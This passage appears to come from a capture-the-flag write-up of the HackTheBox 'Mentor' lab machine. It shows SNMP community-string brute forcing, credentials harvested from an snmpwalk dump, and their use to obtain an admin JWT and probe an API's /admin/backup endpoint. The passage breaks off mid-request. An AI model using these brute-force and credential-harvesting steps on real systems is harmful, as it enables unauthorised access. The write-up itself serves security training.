+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Date: Sun, 19 Feb 2023 06:36:46 GMT
+</span></span><span class=line><span class=cl>Server: uvicorn
+</span></span><span class=line><span class=cl>content-length: 155
+</span></span><span class=line><span class=cl>content-type: application/json
+</span></span><span class=line><span class=cl>access-control-allow-origin: *
+</span></span><span class=line><span class=cl>access-control-allow-credentials: true
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lczJAbWVudG9ycXVvdGVzLmh0YiJ9.o7zBN7X869DZ2c68qXrSRCgeVmtRipgQgzI3hp30WNI&#34;
+</span></span></code></pre></td></tr></table></div></div><p>Now, let&rsquo;s try to hit the <code>/admin</code> endpoint with the above JWT:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 403 Forbidden
+</span></span><span class=line><span class=cl>Date: Sun, 19 Feb 2023 06:39:01 GMT
+</span></span><span class=line><span class=cl>Server: uvicorn
+</span></span><span class=line><span class=cl>content-length: 54
+</span></span><span class=line><span class=cl>content-type: application/json
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{&#34;detail&#34;:&#34;Only admin users can access this resource&#34;}
+</span></span></code></pre></td></tr></table></div></div><p>Damn.. Hitting the <code>/admin</code> endpoint, with what we hoped was an admin-level JWT gives the same error message as above. I created a new account with the <code>admin</code> username, and used the JWT from logging in &ndash; but same results.</p><p>Not convinced I had completely enumerated SNMP, I started to question <code>nmap</code>&rsquo;s snmp-bruteforce script, and looked at it in <code>/usr/share/nmap/scripts/snmp-brute.nse</code>, but couldn&rsquo;t see any version information.</p><p>I found <a href=https://github.com/SECFORCE/SNMP-Brute target=_blank rel="noopener noreffer">SNMP-Brute</a>, which apparently <em>&ldquo;Brute forces both version 1 and version 2c SNMP community strings</em>. Using the same common SNMP community strings word list as before:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$./snmpbrute.py --file ~/SecLists/Discovery/SNMP/common-snmp-community-strings.txt -b -t 10.10.11.193
+</span></span><span class=line><span class=cl>   _____ _   ____  _______     ____             __     
+</span></span><span class=line><span class=cl>  / ___// <span class=p>|</span> / /  <span class=p>|</span>/  / __ <span class=se>\ </span>  / __ <span class=o>)</span>_______  __/ /____ 
+</span></span><span class=line><span class=cl>  <span class=se>\_</span>_ <span class=se>\/</span>  <span class=p>|</span>/ / /<span class=p>|</span>_/ / /_/ /  / __  / ___/ / / / __/ _ <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span> ___/ / /<span class=p>|</span>  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
+</span></span><span class=line><span class=cl>/____/_/ <span class=p>|</span>_/_/  /_/_/      /_____/_/   <span class=se>\_</span>_,_/<span class=se>\_</span>_/<span class=se>\_</span>__/ 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>SNMP Bruteforce <span class=p>&amp;</span> Enumeration Script v2.0
+</span></span><span class=line><span class=cl>http://www.secforce.com / nikos.vassakis &lt;at&gt; secforce.com
+</span></span><span class=line><span class=cl><span class=c1>###############################################################</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Trying <span class=o>[</span><span class=s1>&#39;public&#39;</span>, <span class=s1>&#39;private&#39;</span>, <span class=s1>&#39;0&#39;</span>, <span class=s1>&#39;0392a0&#39;</span>, <span class=s1>&#39;1234&#39;</span>, <span class=s1>&#39;2read&#39;</span>, <span class=s1>&#39;4changes&#39;</span>, <span class=s1>&#39;ANYCOM&#39;</span>, <span class=s1>&#39;Admin&#39;</span>, <span class=s1>&#39;C0de&#39;</span>, <span class=s1>&#39;CISCO&#39;</span>, <span class=s1>&#39;CR52401&#39;</span>, <span class=s1>&#39;IBM&#39;</span>, <span class=s1>&#39;ILMI&#39;</span>, <span class=s1>&#39;Intermec&#39;</span>, <span class=s1>&#39;NoGaH$@!&#39;</span>, <span class=s1>&#39;OrigEquipMfr&#39;</span>, <span class=s1>&#39;PRIVATE&#39;</span>, <span class=s1>&#39;PUBLIC&#39;</span>, <span class=s1>&#39;Private&#39;</span>, <span class=s1>&#39;Public&#39;</span>, <span class=s1>&#39;SECRET&#39;</span>, <span class=s1>&#39;SECURITY&#39;</span>, <span class=s1>&#39;SNMP&#39;</span>, <span class=s1>&#39;SNMP_trap&#39;</span>, <span class=s1>&#39;SUN&#39;</span>, <span class=s1>&#39;SWITCH&#39;</span>, <span class=s1>&#39;SYSTEM&#39;</span>, <span class=s1>&#39;Secret&#39;</span>, <span class=s1>&#39;Security&#39;</span>, <span class=s1>&#39;Switch&#39;</span>, <span class=s1>&#39;System&#39;</span>, <span class=s1>&#39;TENmanUFactOryPOWER&#39;</span>, <span class=s1>&#39;TEST&#39;</span>, <span class=s1>&#39;access&#39;</span>, <span class=s1>&#39;adm&#39;</span>, <span class=s1>&#39;admin&#39;</span>, <span class=s1>&#39;agent&#39;</span>, <span class=s1>&#39;agent_steal&#39;</span>, <span class=s1>&#39;all&#39;</span>, <span class=s1>&#39;all private&#39;</span>, <span class=s1>&#39;all public&#39;</span>, <span class=s1>&#39;apc&#39;</span>, <span class=s1>&#39;bintec&#39;</span>, <span class=s1>&#39;blue&#39;</span>, <span class=s1>&#39;c&#39;</span>, <span class=s1>&#39;cable-d&#39;</span>, <span class=s1>&#39;canon_admin&#39;</span>, <span class=s1>&#39;cc&#39;</span>, <span class=s1>&#39;cisco&#39;</span>, <span class=s1>&#39;community&#39;</span>, <span class=s1>&#39;core&#39;</span>, <span class=s1>&#39;debug&#39;</span>, <span class=s1>&#39;default&#39;</span>, <span class=s1>&#39;dilbert&#39;</span>, <span class=s1>&#39;enable&#39;</span>, <span class=s1>&#39;field&#39;</span>, <span class=s1>&#39;field-service&#39;</span>, <span class=s1>&#39;freekevin&#39;</span>, <span class=s1>&#39;fubar&#39;</span>, <span class=s1>&#39;guest&#39;</span>, <span class=s1>&#39;hello&#39;</span>, <span class=s1>&#39;hp_admin&#39;</span>, <span class=s1>&#39;ibm&#39;</span>, <span class=s1>&#39;ilmi&#39;</span>, <span class=s1>&#39;intermec&#39;</span>, <span class=s1>&#39;internal&#39;</span>, <span class=s1>&#39;l2&#39;</span>, <span class=s1>&#39;l3&#39;</span>, <span class=s1>&#39;manager&#39;</span>, <span class=s1>&#39;mngt&#39;</span>, <span class=s1>&#39;monitor&#39;</span>, <span class=s1>&#39;netman&#39;</span>, <span class=s1>&#39;network&#39;</span>, <span class=s1>&#39;none&#39;</span>, <span class=s1>&#39;openview&#39;</span>, <span class=s1>&#39;pass&#39;</span>, <span class=s1>&#39;password&#39;</span>, <span class=s1>&#39;pr1v4t3&#39;</span>, <span class=s1>&#39;proxy&#39;</span>, <span class=s1>&#39;publ1c&#39;</span>, <span class=s1>&#39;read&#39;</span>, <span class=s1>&#39;read-only&#39;</span>, <span class=s1>&#39;read-write&#39;</span>, <span class=s1>&#39;readwrite&#39;</span>, <span class=s1>&#39;red&#39;</span>, <span class=s1>&#39;regional&#39;</span>, <span class=s1>&#39;rmon&#39;</span>, <span class=s1>&#39;rmon_admin&#39;</span>, <span class=s1>&#39;ro&#39;</span>, <span class=s1>&#39;root&#39;</span>, <span class=s1>&#39;router&#39;</span>, <span class=s1>&#39;rw&#39;</span>, <span class=s1>&#39;rwa&#39;</span>, <span class=s1>&#39;san-fran&#39;</span>, <span class=s1>&#39;sanfran&#39;</span>, <span class=s1>&#39;scotty&#39;</span>, <span class=s1>&#39;secret&#39;</span>, <span class=s1>&#39;security&#39;</span>, <span class=s1>&#39;seri&#39;</span>, <span class=s1>&#39;snmp&#39;</span>, <span class=s1>&#39;snmpd&#39;</span>, <span class=s1>&#39;snmptrap&#39;</span>, <span class=s1>&#39;solaris&#39;</span>, <span class=s1>&#39;sun&#39;</span>, <span class=s1>&#39;superuser&#39;</span>, <span class=s1>&#39;switch&#39;</span>, <span class=s1>&#39;system&#39;</span>, <span class=s1>&#39;tech&#39;</span>, <span class=s1>&#39;test&#39;</span>, <span class=s1>&#39;test2&#39;</span>, <span class=s1>&#39;tiv0li&#39;</span>, <span class=s1>&#39;tivoli&#39;</span>, <span class=s1>&#39;trap&#39;</span>, <span class=s1>&#39;world&#39;</span>, <span class=s1>&#39;write&#39;</span>, <span class=s1>&#39;xyzzy&#39;</span>, <span class=s1>&#39;yellow&#39;</span><span class=o>]</span> community strings ...
+</span></span><span class=line><span class=cl>10.10.11.193 : <span class=m>161</span>     Version <span class=o>(</span>v1<span class=o>)</span>:    public
+</span></span><span class=line><span class=cl>10.10.11.193 : <span class=m>161</span>     Version <span class=o>(</span>v2c<span class=o>)</span>:    public
+</span></span><span class=line><span class=cl>10.10.11.193 : <span class=m>161</span>     Version <span class=o>(</span>v2c<span class=o>)</span>:    internal
+</span></span><span class=line><span class=cl>Waiting <span class=k>for</span> late packets <span class=o>(</span>CTRL+C to stop<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Trying identified strings <span class=k>for</span> READ-WRITE ...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Identified Community strings
+</span></span><span class=line><span class=cl>    0<span class=o>)</span> 10.10.11.193    public <span class=o>(</span>v1<span class=o>)(</span>RO<span class=o>)</span>
+</span></span><span class=line><span class=cl>    1<span class=o>)</span> 10.10.11.193    public <span class=o>(</span>v2c<span class=o>)(</span>RO<span class=o>)</span>
+</span></span><span class=line><span class=cl>    2<span class=o>)</span> 10.10.11.193    internal <span class=o>(</span>v2c<span class=o>)(</span>RO<span class=o>)</span>
+</span></span><span class=line><span class=cl>Finished!
+</span></span></code></pre></td></tr></table></div></div><p>So we found community string also &lsquo;internal&rsquo; works in addition to &lsquo;public&rsquo; &ndash; but somehow <code>nmap</code> didn&rsquo;t find this before (?!?!). I&rsquo;m assuming here that <code>snmpbrute</code> properly brute forces SNMP v2c, whereas <code>nmap</code> does not &ndash; the &lsquo;internal&rsquo; community string is just SNMP v2c, not v1.</p><p>Let&rsquo;s enumerate with <code>snmpwalk</code> &ndash; redirecting the output to snmp.txt, given there is a <strong>lot</strong> of output, much more than the public community string. We make sure to specify version 2c, given the newly found community string is <em>only</em> version 2c:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> <span class=nv>$snmpwalk</span> -v 2c -c internal 10.10.11.193 &gt; snmp.txt
+</span></span></code></pre></td></tr></table></div></div><p>I will spare you the gory details, as the output contains a lot &ndash; running processes, and basically everything imaginable. A very quick scroll through gave a lot of noise, and wasn&rsquo;t very interesting.</p><p>Let&rsquo;s grep for anything interesting that may help us get access to the system:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>grep -E <span class=s1>&#39;user|login|pass|root|admin&#39;</span> snmp.txt 
+</span></span><span class=line><span class=cl>SNMPv2-MIB::sysContact.0 <span class=o>=</span> STRING: Me &lt;admin@mentorquotes.htb&gt;
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 <span class=o>=</span> STRING: <span class=s2>&#34;BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
+</span></span></span><span class=line><span class=cl><span class=s2>HOST-RESOURCES-MIB::hrSWRunName.912 = STRING: &#34;</span>systemd-logind<span class=s2>&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>HOST-RESOURCES-MIB::hrSWRunName.1696 = STRING: &#34;</span>login.sh<span class=s2>&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>HOST-RESOURCES-MIB::hrSWRunName.2104 = STRING: &#34;</span>login.py<span class=s2>&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>HOST-RESOURCES-MIB::hrSWRunPath.912 = STRING: &#34;</span>/lib/systemd/systemd-logind<span class=s2>&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>HOST-RESOURCES-MIB::hrSWRunParameters.1696 = STRING: &#34;</span>/usr/local/bin/login.sh<span class=s2>&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>HOST-RESOURCES-MIB::hrSWRunParameters.2104 = STRING: &#34;</span>/usr/local/bin/login.py kj23sadkj123as0-d213<span class=s2>&#34;
+</span></span></span></code></pre></td></tr></table></div></div><p>It looks like from the above maybe <code>kj23sadkj123as0-d213</code> is a password being passed as an argument to a python script located at <code>/usr/local/bin/login.py</code>.</p><p>I tried SSHing into the machine with usernames <code>admin@mentorquotes.htb</code> and <code>james@mentorquotes.htb</code> using <code>kj23sadkj123as0-d213</code> as the password, but failed.</p><p>Let&rsquo;s try the auth endpoint against the exposed API again:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /auth/login HTTP/1.1
+</span></span><span class=line><span class=cl>Host: api.mentorquotes.htb
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+</span></span><span class=line><span class=cl>Accept: application/json
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Referer: http://mentorquotes.htb/docs
+</span></span><span class=line><span class=cl>Content-Type: application/json
+</span></span><span class=line><span class=cl>Origin: http://mentorquotes.htb
+</span></span><span class=line><span class=cl>Content-Length: 100
+</span></span><span class=line><span class=cl>DNT: 1
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>  &#34;email&#34;: &#34;james@mentorquotes.htb&#34;,
+</span></span><span class=line><span class=cl>  &#34;username&#34;: &#34;james&#34;,
+</span></span><span class=line><span class=cl>  &#34;password&#34; :&#34;kj23sadkj123as0-d213&#34;
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Date: Sun, 19 Feb 2023 07:05:44 GMT
+</span></span><span class=line><span class=cl>Server: uvicorn
+</span></span><span class=line><span class=cl>content-length: 154
+</span></span><span class=line><span class=cl>content-type: application/json
+</span></span><span class=line><span class=cl>access-control-allow-origin: *
+</span></span><span class=line><span class=cl>access-control-allow-credentials: true
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#34;
+</span></span></code></pre></td></tr></table></div></div><p>We have a JWT.. Now let&rsquo;s try the <code>/users</code> endpoint again. We use <code>-s</code> for silent output, <code>-H</code> to specify our Host and Authorization headers. Note we specify the url <a href=http://api.mentorquotes.htb/users target=_blank rel="noopener noreffer">http://api.mentorquotes.htb/users</a>, as the main domain will 302 redirect here anyway:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -s -H <span class=s2>&#34;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#34;</span> -H <span class=s2>&#34;Host: api.mentorquotes.htb&#34;</span> http://api.mentorquotes.htb/users <span class=p>|</span> jq
+</span></span><span class=line><span class=cl><span class=o>[</span>
+</span></span><span class=line><span class=cl>  <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: 1,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>: <span class=s2>&#34;james@mentorquotes.htb&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;james&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>,
+</span></span><span class=line><span class=cl>  <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: 2,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>: <span class=s2>&#34;svc@mentorquotes.htb&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;service_acc&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>,
+</span></span><span class=line><span class=cl>  <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: 4,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>: <span class=s2>&#34;foo@bar.com&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;foobar&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>,
+</span></span><span class=line><span class=cl>  <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: 5,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>: <span class=s2>&#34;james@foo.bar&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;james&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>,
+</span></span><span class=line><span class=cl>  <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: 6,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>: <span class=s2>&#34;admin@mentorquotes.htb&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;admin&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>,
+</span></span><span class=line><span class=cl>  <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: 7,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>: <span class=s2>&#34;james2@mentorquotes.htb&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;james&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>,
+</span></span><span class=line><span class=cl>  <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: 8,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>: <span class=s2>&#34;admin2@mentorquotes.htb&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;admin&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>,
+</span></span><span class=line><span class=cl>  <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: 9,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>: <span class=s2>&#34;admin3@mentorquotes.htb&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;mentor&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>,
+</span></span><span class=line><span class=cl>  <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: 10,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>: <span class=s2>&#34;james22@mentorquotes.htb&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;james&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>,
+</span></span><span class=line><span class=cl>  <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: 11,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>: <span class=s2>&#34;james222@mentorquotes.htb&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;james&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>,
+</span></span><span class=line><span class=cl>  <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: 12,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>: <span class=s2>&#34;james2@foo.bar&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;james&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>Not great, but a little progress &ndash; we have admin privileges to the API and we can see all the junk accounts I created trying to get access initially, including the account for james and finally what looks like a service account. We can also reach the <code>/admin</code> endpoint now &ndash; which appears to be a rather crude API service discovery endpoint:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -s -L -H <span class=s2>&#34;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#34;</span> -H <span class=s2>&#34;Host: api.mentorquotes.htb&#34;</span> http://api.mentorquotes.htb/admin <span class=p>|</span> jq
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;admin_funcs&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;check db connection&#34;</span>: <span class=s2>&#34;/check&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;backup the application&#34;</span>: <span class=s2>&#34;/backup&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>GET <code>/admin/backup</code> gives a <em>Method Not Allowed</em> error. POST with an empty JSON body gives:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 422 Unprocessable Entity
+</span></span><span class=line><span class=cl>Date: Sun, 19 Feb 2023 07:21:38 GMT
+</span></span><span class=line><span class=cl>Server: uvicorn
+</span></span><span class=line><span class=cl>content-length: 88
+</span></span><span class=line><span class=cl>content-type: application/json
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{&#34;detail&#34;:[{&#34;loc&#34;:[&#34;body&#34;,&#34;path&#34;],&#34;msg&#34;:&#34;field required&#34;,&#34;type&#34;:&#34;value_error.missing&#34;}]}
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s specify a path, seeing as though the input validation fails on this field:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /admin/backup HTTP/1.1
+</span></span><span class=line><span class=cl>Host: api.mentorquotes.htb
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+</span></span><span class=line><span class=cl>Accept: application/json
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Referer: http://api.mentorquotes.htb/docs
+</span></span><span class=line><span class=cl>DNT: 1
+</span></span><span class=line><span class=cl>Connection: close
